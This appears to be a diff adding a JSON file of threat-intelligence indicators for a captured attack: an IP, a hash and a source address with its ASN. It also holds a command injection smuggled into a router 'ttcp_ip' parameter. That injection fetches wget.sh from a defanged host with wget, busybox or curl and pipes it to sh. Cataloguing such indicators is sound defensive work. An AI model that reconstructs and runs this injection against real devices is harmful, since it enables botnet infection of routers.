@@ -1,0 +1,33 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bbusybox%20wget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bcurl%20hxxp://91[.]92[.]40[.]XXX/wget.sh%7Csh%20-s%20lunblkv%60"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "91[.]92[.]40.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "ttcp_num=3&ttcp_size=3&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bbusybox%"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "9be8067aea0dba0ec5fb559b4506cddc414ae4c0062cf9e6d05de0d350d9efa2"
+  },
+  {
+    "asn": "TechTies Inc.",
+    "country": "The Netherlands",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "45[.]156[.]87.XXX"
+  }
+]
